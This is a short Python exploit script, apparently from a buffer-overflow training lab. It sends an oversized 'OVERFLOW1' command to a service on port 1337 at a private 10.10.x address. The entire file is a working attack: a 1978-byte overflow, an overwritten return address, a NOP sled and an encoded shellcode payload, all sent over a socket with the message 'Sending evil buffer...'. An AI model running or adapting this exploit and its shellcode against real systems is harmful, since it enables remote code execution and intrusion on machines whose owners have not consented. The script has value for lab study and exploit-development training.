import socket

ip = "10.10.146.38"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\x05\x12\x50\x62"
padding = "\x90" * 16


payload = ("\xbb\xfb\xfd\xf4\x3a\xdb\xdc\xd9\x74\x24\xf4\x58\x29\xc9"
"\xb1\x52\x31\x58\x12\x83\xc0\x04\x03\xa3\xf3\x16\xcf\xaf"
"\xe4\x55\x30\x4f\xf5\x39\xb8\xaa\xc4\x79\xde\xbf\x77\x4a"
"\x94\xed\x7b\x21\xf8\x05\x0f\x47\xd5\x2a\xb8\xe2\x03\x05"
"\x39\x5e\x77\x04\xb9\x9d\xa4\xe6\x80\x6d\xb9\xe7\xc5\x90"
"\x30\xb5\x9e\xdf\xe7\x29\xaa\xaa\x3b\xc2\xe0\x3b\x3c\x37"
"\xb0\x3a\x6d\xe6\xca\x64\xad\x09\x1e\x1d\xe4\x11\x43\x18"
"\xbe\xaa\xb7\xd6\x41\x7a\x86\x17\xed\x43\x26\xea\xef\x84"
"\x81\x15\x9a\xfc\xf1\xa8\x9d\x3b\x8b\x76\x2b\xdf\x2b\xfc"
"\x8b\x3b\xcd\xd1\x4a\xc8\xc1\x9e\x19\x96\xc5\x21\xcd\xad"
"\xf2\xaa\xf0\x61\x73\xe8\xd6\xa5\xdf\xaa\x77\xfc\x85\x1d"
"\x87\x1e\x66\xc1\x2d\x55\x8b\x16\x5c\x34\xc4\xdb\x6d\xc6"
"\x14\x74\xe5\xb5\x26\xdb\x5d\x51\x0b\x94\x7b\xa6\x6c\x8f"
"\x3c\x38\x93\x30\x3d\x11\x50\x64\x6d\x09\x71\x05\xe6\xc9"
"\x7e\xd0\xa9\x99\xd0\x8b\x09\x49\x91\x7b\xe2\x83\x1e\xa3"
"\x12\xac\xf4\xcc\xb9\x57\x9f\xf8\x35\x46\x91\x95\x47\x68"
"\x0e\x4f\xc1\x8e\x3a\x9f\x87\x19\xd3\x06\x82\xd1\x42\xc6"
"\x18\x9c\x45\x4c\xaf\x61\x0b\xa5\xda\x71\xfc\x45\x91\x2b"
"\xab\x5a\x0f\x43\x37\xc8\xd4\x93\x3e\xf1\x42\xc4\x17\xc7"
"\x9a\x80\x85\x7e\x35\xb6\x57\xe6\x7e\x72\x8c\xdb\x81\x7b"
"\x41\x67\xa6\x6b\x9f\x68\xe2\xdf\x4f\x3f\xbc\x89\x29\xe9"
"\x0e\x63\xe0\x46\xd9\xe3\x75\xa5\xda\x75\x7a\xe0\xac\x99"
"\xcb\x5d\xe9\xa6\xe4\x09\xfd\xdf\x18\xaa\x02\x0a\x99\xca"
"\xe0\x9e\xd4\x62\xbd\x4b\x55\xef\x3e\xa6\x9a\x16\xbd\x42"
"\x63\xed\xdd\x27\x66\xa9\x59\xd4\x1a\xa2\x0f\xda\x89\xc3"
"\x05"


)



postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
